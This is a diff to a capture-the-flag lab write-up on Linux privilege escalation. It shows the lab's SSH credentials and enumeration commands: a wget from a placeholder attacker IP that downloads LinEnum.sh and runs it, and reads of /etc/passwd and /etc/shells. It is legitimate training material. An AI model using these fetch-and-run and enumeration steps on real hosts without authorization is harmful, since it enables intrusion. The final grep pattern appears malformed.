@@ -2,7 +2,8 @@ Common Linux Privesc
 ####################
 :Author: David Boyd
 :Date: 2020-06-02
-:SSH Login: user3, password
+:SSH User: user3
+:SSH Password: password
 
 [Task 4] Enumeration
 ====================
@@ -66,7 +67,7 @@ Sandbox
 	python3 -m http.server 8000
 
 	# TM
-	wget my.ip.add.ress:8000/LinEnum.sh
+	wget my.ip.addr.ess:8000/LinEnum.sh
 	chmod +x LinEnum.sh
 	./LinEnum.sh
 
@@ -81,8 +82,14 @@ Questions
 
 	# Look at the output of /etc/passwd,
 	# how many "user[x]" are there on the system?
-	cat /etc/passwd | grep user[0-9]
+	cat /etc/passwd | grep user[0-9] | cut -d ':' -f1
 
 	# How many available shells are there on the system?
-	cat /etc/shells
+	cat -n /etc/shells
+
+	# What critical file has had it permissions changed to allow some users to
+	# write to it?
+	### > critical files include /etc/, /var/
+	### > permissions change would typically include user groups' changes
+	ls -l | grep -E "\-[rwx-]{4}w]"
 
